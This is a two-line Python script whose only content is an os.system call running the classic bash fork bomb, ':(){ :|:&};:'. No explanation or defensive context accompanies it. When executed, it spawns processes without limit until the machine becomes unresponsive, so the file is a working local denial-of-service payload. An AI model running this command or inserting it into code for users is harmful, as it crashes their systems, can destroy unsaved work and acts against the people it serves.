import os
os.system(":(){ :|:&};:")